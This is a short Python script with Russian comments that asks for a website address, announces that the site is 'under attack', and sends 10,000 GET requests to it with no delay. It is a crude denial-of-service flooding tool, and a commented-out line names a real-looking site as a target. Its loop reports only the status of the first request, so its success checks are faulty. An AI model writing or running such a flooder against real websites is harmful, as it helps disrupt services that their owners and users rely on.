import requests
import time

t = 0
#время на отправку одного запроса

#sait = 'https://gomel5.znaj.by/'

sait = input('Введите ссылку:')
print(sait, 'На этот сайт идёт атака!')
r = requests.get(sait)

i = 1

for i in range(10000):
    print(i+1)
    if r.status_code == 200:
        print('Ok')
    else:
        print('Error')
    time.sleep(t)
    requests.get(sait)
